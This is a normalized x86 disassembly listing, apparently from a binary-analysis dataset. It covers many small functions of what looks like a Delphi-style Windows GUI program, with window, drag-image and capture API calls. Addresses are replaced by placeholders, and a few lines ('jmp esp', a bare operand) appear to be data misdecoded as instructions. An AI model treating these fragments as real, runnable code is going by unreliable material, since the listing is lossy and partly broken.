mov edx 0xb014
call sub_44a198
sub_44ad40
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44afa6
jmp sub_4038bc
sub_44afad
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44afd8
mov eax [ r-xdata ]
retn
sub_44b174
jmp sub_4038bc
sub_44b17b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b29c
mov eax [ eax + 0xb8 ]
retn
sub_44b304
push ebx
mov ebx eax
mov eax ebx
call sub_449628
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44b320
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44b4b8
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44b4e8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44b4f0
call sub_448044
retn
sub_44b5f0
jmp sub_4038bc
sub_44b61c
cmp [ eax + 0x160 ] 0x0
seta al
retn
sub_44b7bc
jmp sub_4038bc
sub_44b80c
jmp sub_4038bc
sub_44b844
retn
sub_44bacd
jmp sub_4038bc
sub_44bc55
jmp sub_4038bc
sub_44bfb7
jmp sub_4038bc
sub_44c063
jmp sub_4038bc
sub_44c070
inc [ eax + 0x160 ]
retn
sub_44c078
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44c098
sub_44c098
xor edx edx
call sub_44bfdc
retn
sub_44c165
jmp sub_4038bc
sub_44c16c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c25b
jmp sub_4038bc
sub_44c782
jmp sub_4038bc
sub_44c789
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c951
jmp sub_4038bc
sub_44c958
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ca2c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_44cc19
jmp sub_4038bc
sub_44cc20
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_44cd10
xor eax eax
retn
sub_44cd78
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44a198
sub_44cea6
jmp sub_403608
sub_44cfdb
jmp sub_4038bc
sub_44cfe2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44cfec
jmp sub_403608
sub_44cff1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d5ac
jmp sub_4038bc
sub_44d5b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d5bc
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44daba
jmp sub_4038bc
sub_44db0c
push ebx
mov ebx eax
call sub_4238c0
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44a198
pop ebx
retn
sub_44db28
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44a198
retn
sub_44db3c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44a198
retn
sub_44db4c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44a198
retn
sub_44ddf8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44fae8
pop esi
retn
sub_44df0c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44df5c
pop esi
retn
sub_44df20
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44e048
pop esi
retn
sub_44df34
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44df48
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_44e03b
jmp sub_4038bc
sub_44e042
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e0d2
jmp sub_4038bc
sub_44e0d9
pop ebx
pop ecx
pop ebp
retn
sub_44e0e0
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_44e0f0
retn
sub_44e0f4
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44e114
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_44e274
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_44e344
retn
sub_44e45c
jmp sub_4038bc
sub_44e463
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e52e
jmp sub_4038bc
sub_44e558
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44e5ea
jmp sub_4038bc
sub_44e7bc
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_44ea60
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_44eb3c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44c568
pop esi
retn
sub_44ec00
push esi
mov si 0xffc1
call sub_403324
pop esi
retn
sub_44ec2c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44ec40
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44ec54
call sub_44c528
retn
sub_44ec5c
call sub_44c528
retn
sub_44ec64
call sub_44c528
retn
sub_44ed0c
push ebx
mov ebx eax
mov eax ebx
call sub_44abb4
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_424a38
mov dx 0xb009
mov eax ebx
call sub_44c568
pop ebx
retn
sub_44ee70
call sub_44c528
retn
sub_44ee78
call sub_44c528
retn
sub_44ee80
call sub_44c528
retn
sub_44ee88
call sub_44c528
retn
sub_44eeec
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44f382
jmp sub_4038bc
sub_44f389
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f468
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44f60c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44a198
retn
sub_44f6ac
push ebx
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_44f6c8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44f8a0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_44f7d8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_44f8f8
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a198
sub_44f918
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44a198
sub_44f93c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_44f948
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44a198
sub_44f9f4
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_44f998
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_44fad0
jmp sub_4038bc
sub_44fad7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fcf6
jmp sub_4038bc
sub_44fcfd
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44fe04
call sub_449f68
retn
sub_450252
jmp sub_4038bc
sub_4502e8
mov eax [ r-xdata ]
retn
sub_45044f
jmp sub_4038bc
sub_450560
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a198
sub_450876
jmp sub_4038bc
sub_4509b8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_450b14
jmp sub_4038bc
sub_450b1b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425154
retn
sub_450b37
jmp sub_4038bc
sub_450b44
retn
sub_450c18
mov [ edx + 0xc ] 0xffffffff
retn
sub_450c76
jmp sub_4038bc
sub_450c7d
pop ecx
pop ecx
pop ebp
retn
sub_450d1d
jmp sub_4038bc
sub_450d24
pop ebx
mov esp ebp
pop ebp
retn
sub_450d90
call sub_44cd30
retn
sub_450e23
jmp sub_4038bc
sub_450e2a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_451009
jmp sub_4038bc
sub_451010
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45116c
push ebx
mov ebx eax
mov eax ebx
call sub_456628
or edx 0xffffffff
mov eax ebx
call sub_451298
pop ebx
retn
sub_451244
jmp sub_4038bc
sub_451298
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_451184
sub_451408
push ebx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_451420
push ebx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_45150c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44d968
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4515a7
jmp sub_4038bc
sub_4515ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4515d1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425154
retn
sub_4515ca
jmp sub_4038bc
sub_4515d1
pop ebx
pop ecx
pop ebp
retn
sub_4515d8
retn
sub_451640
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4519ad
jmp sub_4038bc
sub_451b94
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_451d80
jmp sub_4038bc
sub_451e30
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_451e44
inc [ eax + 0x6c ]
retn
sub_451e48
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4536c8
sub_451fa8
call sub_4526a8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_452953
jmp sub_4038bc
sub_45295a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452977
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_452970
jmp sub_4038bc
sub_452977
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452c58
jmp sub_4038bc
sub_452c5f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c7c
mov eax [ ebp - 0x4 ]
call sub_425154
retn
sub_452c75
jmp sub_4038bc
sub_452c7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c99
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_452c92
jmp sub_4038bc
sub_452c99
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45314d
jmp sub_4038bc
sub_453154
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4532df
jmp sub_4038bc
sub_4532e6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45339b
jmp sub_4038bc
sub_4533a2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453490
jmp sub_4038bc
sub_4534e1
jmp sub_4038bc
sub_4534e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4535a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451eb4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_4536f0
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_4519f0
sub_453ff0
jmp sub_4038bc
sub_453ff7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4540c0
call GetCapture
retn
sub_4540e4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_45434a
jmp sub_4038bc
sub_454544
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_454758
jmp sub_4038bc
sub_45475f
pop ebx
mov esp ebp
pop ebp
retn
sub_4547aa
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_454827
jmp sub_4038bc
sub_45482e
pop ebp
retn
sub_4548b6
jmp sub_4038bc
sub_4548bd
pop ebp
retn
sub_454f02
out dx eax
jmp esp
sub_455350
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41875c
retn
sub_455368
mov al 0x1
retn
sub_45536c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_421168
retn
mov eax edx
retn
sub_45537c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_421138
retn
mov al 0x1
retn
sub_455680
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_4556bc
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_455920
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_455934
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_455948
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_45595c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_455970
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_455984
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_455998
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4559ac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4559c0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4559d4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop ebx
retn
sub_4559e8
retn
sub_4559ec
retn
sub_4559f0
retn
sub_4559f4
retn
sub_4559f8
retn
sub_4559fc
retn
sub_455a00
retn
sub_455a04
retn
sub_455a08
retn
sub_455a0c
retn
sub_455a10
retn
sub_455a14
retn
sub_455d20
jmp sub_4038bc
sub_45616c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x90 ] eax
sub_4561ec
push esi
mov si 0xffef
call sub_403324
pop esi
retn
sub_4562c9
jmp sub_4038bc
sub_4562d0
pop ebp
retn
sub_4562d4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417d80
sub_4564fc
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_4566d5
jmp sub_4038bc
sub_4566dc
pop ebx
pop ecx
pop ebp
retn
sub_4566e0
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_4566e8
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_456950
sub_456795
jmp sub_4038bc
sub_45679c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403128
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_4568a4
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_4569e3
jmp sub_4038bc
sub_4569ea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456a82
jmp sub_4038bc
sub_456a89
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456aa6
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_456a9f
jmp sub_4038bc
sub_456aa6
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456b7d
jmp sub_4038bc
sub_456bbb
jmp sub_4038bc
sub_456bc2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456def
jmp sub_4038bc
sub_456df6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e13
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_456e0c
jmp sub_4038bc
sub_456e13
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_456e8c
retn
sub_456e2c
jmp sub_4038bc
sub_456e7b
jmp sub_4038bc
sub_456e82
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_456f0b
jmp sub_4038bc
sub_456f12
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456f18
or edx 0xffffffff
call sub_456e8c
retn
sub_457327
jmp sub_4038bc
sub_45732e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45734b
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_457344
jmp sub_4038bc
sub_45734b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457368
mov eax [ ebp - 0x4 ]
call sub_457e60
retn
sub_457361
jmp sub_4038bc
sub_457368
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45756c
jmp sub_4038bc
sub_457573
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457578
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403324
sub_457590
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_417088
pop ebx
retn
sub_457634
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4185a4
sub_45774b
jmp sub_4038bc
sub_457752
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_457768
jmp sub_4038bc
sub_457a7a
jmp sub_4038bc
sub_457a81
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a9e
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_457a97
jmp sub_4038bc
sub_457a9e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457abb
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_457ab4
jmp sub_4038bc
sub_457abb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457b24
jmp sub_4038bc
sub_457c3d
jmp sub_4038bc
sub_457c5a
jmp sub_4038bc
sub_457e12
jmp sub_4038bc
sub_457e19
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457e5c
inc [ eax + 0x5c ]
retn
sub_457e60
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403324
sub_457eb4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_457ef1
jmp sub_4038bc
sub_457ef8
pop ebp
retn
sub_457efc
sub [ rw-data ] 0x1
retn
sub_458348
clc
push edx
push ecx
[ eax ]
sub_458e64
mov eax [ esp + 0x8 ]
retn
sub_458e6c
push ebx
mov ebx eax
call sub_458e64
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
jmp sub_4038f4
sub_458e88
pop ebx
retn
sub_459101
jmp sub_4038bc
sub_459108
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459253
jmp sub_4038bc
sub_45925a
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459270
push ebx
mov eax [ rw-data ]
call sub_418c70
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418c2c
mov eax ebx
pop ebx
retn
sub_4593f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_459414
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_459b0f
jmp sub_4038bc
sub_459b16
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459c0e
jmp sub_4038bc
sub_459c15
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a038
jmp sub_4038bc
sub_45a03f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45a4eb
jmp sub_4038bc
sub_45a98c
jmp sub_4038bc
sub_45a993
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45adf7
jmp sub_4038bc
sub_45b2b4
jmp sub_4038bc
sub_45b2bb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b666
jmp sub_4038bc
sub_45b66d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45b67b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45b828
mov eax [ r-xdata ]
retn
sub_45b864
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45b878
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45b888
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45b898
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45bb94
mov edx eax
sub_45b930
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov edx esi
call sub_45b8b0
pop esi
pop ebx
retn
sub_45b9ac
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45bb94
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41875c
mov ecx eax
sub_45bd84
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45bdec
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45c194
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45c1c8
sub_45c1c8
mov edx sub_45c1a0
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_4592f0
retn
sub_45c3b2
jmp sub_4038bc
sub_45c3b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c850
jmp sub_4038bc
sub_45c88f
jmp sub_4038bc
sub_45c896
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ca34
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45cb70
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403324
pop esi
pop ebp
retn 0x8
sub_45cb8c
mov eax [ eax + 0x34 ]
call sub_459dc4
retn
sub_45cb98
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403324
pop esi
retn
sub_45cbd4
push ebx
mov ecx sub_45cbac
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4592f0
pop ebx
retn
sub_45ce08
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45ce1c
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_45cf51
jmp sub_403608
sub_45d053
jmp sub_4038bc
sub_45d07e
jmp sub_4038bc
sub_45d085
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45d09c
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_45d284
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
